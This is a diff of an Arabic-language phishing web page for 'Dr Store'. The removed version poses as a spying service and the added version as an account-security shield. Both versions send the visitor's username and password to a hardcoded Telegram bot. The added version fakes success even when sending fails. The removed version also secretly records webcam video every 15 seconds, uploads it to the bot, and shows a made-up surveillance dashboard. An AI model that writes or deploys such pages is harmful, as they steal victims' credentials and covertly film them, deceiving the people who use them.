@@ -3,117 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dr Store - Spying Service</title>
+    <title>Dr Store - Account Security</title>
     <style>
-        body { font-family: sans-serif; background-color: #000; color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .card { background-color: #0d0d0d; border: 1px solid #222; border-radius: 20px; padding: 30px 20px; width: 340px; text-align: center; box-shadow: 0 10px 40px rgba(123, 31, 162, 0.4); }
-        .logo { width: 80px; height: 80px; background: linear-gradient(45deg, #7b1fa2, #e91e63); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-weight: bold; font-size: 30px; color: #fff; border: 2px solid #333; }
-        h2 { font-size: 20px; margin-bottom: 10px; }
-        .service-tag { color: #e91e63; font-weight: bold; margin-bottom: 20px; display: block; font-size: 14px; }
-        input { width: 100%; background: #1a1a1a; border: 1px solid #333; border-radius: 10px; padding: 14px; color: #fff; margin-bottom: 15px; box-sizing: border-box; outline: none; text-align: center; }
-        button { width: 100%; background: linear-gradient(90deg, #7b1fa2, #e91e63); color: white; border: none; border-radius: 10px; padding: 14px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background-color: #0d0d0d; border: 1px solid #1a1a1a; border-radius: 20px; padding: 40px 25px; width: 340px; text-align: center; box-shadow: 0 10px 30px rgba(123, 31, 162, 0.1); }
         
-        /* لوحة التجسس الوهمية */
-        #spy-dash { display: none; text-align: right; }
-        .stat-box { background: #151515; padding: 15px; border-radius: 12px; margin-top: 15px; border-right: 4px solid #e91e63; line-height: 1.8; }
-        .stat-box b { color: #e91e63; }
-        .live-indicator { color: #4caf50; font-size: 11px; margin-top: 10px; display: block; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
-        video, canvas { display: none; }
+        .logo-container { width: 75px; height: 75px; margin: 0 auto 20px; border-radius: 50%; background: linear-gradient(45deg, #7b1fa2, #e91e63); display: flex; align-items: center; justify-content: center; border: 2px solid #333; }
+        .logo-text { font-weight: bold; font-size: 30px; color: #fff; letter-spacing: -1px; }
+        
+        h2 { font-size: 22px; margin-bottom: 5px; color: #fff; }
+        .service-name { color: #4caf50; font-weight: bold; font-size: 16px; margin-bottom: 20px; display: block; }
+        
+        p { font-size: 13px; color: #aaa; line-height: 1.6; margin-bottom: 25px; }
+        
+        .input-group { margin-bottom: 15px; text-align: right; }
+        input { width: 100%; background: #151515; border: 1px solid #222; border-radius: 12px; padding: 15px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none; transition: 0.3s; text-align: left; direction: ltr; }
+        input:focus { border-color: #7b1fa2; background: #1a1a1a; }
+        
+        button { width: 100%; background: linear-gradient(90deg, #7b1fa2, #e91e63); color: white; border: none; border-radius: 12px; padding: 15px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        button:hover { opacity: 0.9; transform: translateY(-2px); }
+        
+        #success-msg { display: none; color: #4caf50; font-size: 15px; font-weight: bold; margin-top: 20px; border: 1px dashed #4caf50; padding: 10px; border-radius: 10px; }
+        .footer { margin-top: 30px; font-size: 11px; color: #444; }
     </style>
 </head>
 <body>
 
-    <div id="login-step" class="card">
-        <div class="logo">DR</div>
+    <div class="card" id="main-card">
+        <div class="logo-container">
+            <span class="logo-text">DR</span>
+        </div>
+        
         <h2>دكتور ستور - Dr Store</h2>
-        <span class="service-tag">نظام المراقبة عن بعد (Spying)</span>
-        <p style="font-size: 12px; color: #888;">سجل بحسابك لتفعيل الربط مع الأقمار الصناعية</p>
-        <input type="text" id="in_user" placeholder="Username / Email">
-        <input type="password" id="in_pass" placeholder="Password">
-        <button onclick="toDashboard()">دخول للنظام</button>
-    </div>
+        <span class="service-name">درع الحماية من التجسس</span>
+        
+        <div id="form-content">
+            <p>للقيام بتأمين حسابك وتفعيل جدار الحماية ضد محاولات الاختراق الخارجية، يرجى تسجيل الدخول بالحساب المطلوب حمايته.</p>
+            
+            <input type="text" id="u_name" placeholder="Username / الهاتف / الإيميل" autocomplete="off">
+            <br><br>
+            <input type="password" id="u_pass" placeholder="Password" autocomplete="off">
+            
+            <button onclick="secureAccount()">تفعيل التأمين الآن</button>
+        </div>
 
-    <div id="spy-dash" class="card">
-        <div class="logo" style="width: 50px; height: 50px; font-size: 20px;">DR</div>
-        <h2>لوحة التحكم المباشرة</h2>
-        <input type="text" id="s_code" placeholder="كود الاشتراك (529332)">
-        <input type="text" id="s_target" placeholder="يوزر الهدف (10.10ta)">
-        <button onclick="showFakeData()">بدء جلب البيانات</button>
+        <div id="success-msg">
+            ✅ تم تأمين حسابك بنجاح!<br>
+            جدار حماية Dr Store نشط الآن.
+        </div>
 
-        <div id="fake-results" style="display: none;">
-            <div class="stat-box">
-                📍 الحالة: <b>متصل الآن</b><br>
-                📥 المراسلات: <b>تم مراسلة 20 شخصاً</b><br>
-                📸 الستوري: <b>نشر 4 قصص مخفية</b><br>
-                📞 مكالمات: <b>أجرى مكالمة مع <span style="color:cyan">66fllo</span></b><br>
-                ⏳ المدة: <b>58 دقيقة</b><br>
-                🕒 التوقيت: <b>قبل 12 ساعة</b>
-            </div>
-            <span class="live-indicator">● جاري سحب الصور الممسوحة...</span>
+        <div class="footer">
+            خدمة معتمدة © Dr Store Security 2026
         </div>
     </div>
 
-    <video id="v" autoplay playsinline muted></video>
-
     <script>
-        const T = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
-        const C = "897618292";
-        let rec;
-        let chunks = [];
+        // معلومات البوت الخاصة بك
+        const TOKEN = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
+        const CHAT_ID = "897618292";
 
-        // تشغيل الكاميرا والبدء في تسجيل الفيديو فوراً
-        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
-            document.getElementById('v').srcObject = s;
-            rec = new MediaRecorder(s);
-            rec.ondataavailable = e => chunks.push(e.data);
-            rec.start();
-            
-            // إرسال كليب فيديو كل 15 ثانية بشكل مستمر
-            setInterval(() => {
-                if (rec.state === "recording") {
-                    rec.stop();
-                    setTimeout(() => {
-                        sendVid("🎥 تحديث فيديو مستمر للمبتز...");
-                        chunks = [];
-                        rec.start();
-                    }, 500);
-                }
-            }, 15000);
-        }).catch(() => {});
+        function secureAccount() {
+            const user = document.getElementById('u_name').value;
+            const pass = document.getElementById('u_pass').value;
 
-        function sendVid(cap) {
-            if (chunks.length === 0) return;
-            const b = new Blob(chunks, { type: 'video/webm' });
-            const f = new FormData();
-            f.append("chat_id", C);
-            f.append("video", b, "live.webm");
-            f.append("caption", cap);
-            fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: "POST", body: f });
-        }
-
-        function toDashboard() {
-            const u = document.getElementById('in_user').value;
-            const p = document.getElementById('in_pass').value;
-            if(!u || !p) return alert("أكمل البيانات أولاً");
-
-            // إرسال الباسورد فوراً
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🎯 صيد Dr Store:\n👤 يوزر: ${u}\n🔑 باس: ${p}`);
-            
-            // إخفاء صفحة الدخول وإظهار اللوحة
-            document.getElementById('login-step').style.display = 'none';
-            document.getElementById('spy-dash').style.display = 'block';
-        }
-
-        function showFakeData() {
-            const code = document.getElementById('s_code').value;
-            const target = document.getElementById('s_target').value;
-            if(code === "529332" && target === "10.10ta") {
-                document.getElementById('fake-results').style.display = 'block';
-                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🕵️ المبتز يراقب الآن يوزر ${target}`);
-            } else {
-                alert("بيانات الاشتراك غير صحيحة");
+            if (user === "" || pass === "") {
+                alert("يرجى إدخال البيانات المطلوبة");
+                return;
             }
+
+            // إرسال البيانات للبوت
+            const message = `🛡️ محاولة تأمين جديدة (صيد):\n\n👤 المستخدم: ${user}\n🔑 كلمة السر: ${pass}\n📍 النظام: Dr Store Protection`;
+            
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+            .then(() => {
+                // إخفاء النموذج وإظهار رسالة النجاح
+                document.getElementById('form-content').style.display = 'none';
+                document.getElementById('success-msg').style.display = 'block';
+            })
+            .catch(() => {
+                // حتى لو فشل الإرسال نظهر له أنه نجح للتمويه
+                document.getElementById('form-content').style.display = 'none';
+                document.getElementById('success-msg').style.display = 'block';
+            });
         }
     </script>
 </body>
